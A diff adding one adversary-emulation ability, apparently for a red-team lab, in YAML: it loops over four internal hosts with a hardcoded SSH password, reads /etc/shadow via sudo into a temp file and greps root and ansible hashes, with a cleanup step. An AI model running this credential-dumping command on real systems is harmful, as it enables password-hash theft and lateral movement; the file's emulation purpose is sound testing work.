@@ -1,0 +1,16 @@
+- id: ca01-shadow-dump
+  name: Dump Shadow File All Servers
+  description: Read /etc/shadow from all compromised Linux servers
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: OS Credential Dumping - /etc/passwd and /etc/shadow
+  platforms:
+    linux:
+      sh:
+        command: |
+          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40; do echo "=== $h ==="; sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@$h 'sudo cat /etc/shadow' 2>/dev/null; done > /tmp/shadows.txt; grep -E 'root|ansible' /tmp/shadows.txt
+        cleanup: |
+          rm -f /tmp/shadows.txt
+  singleton: false
+  repeatable: false
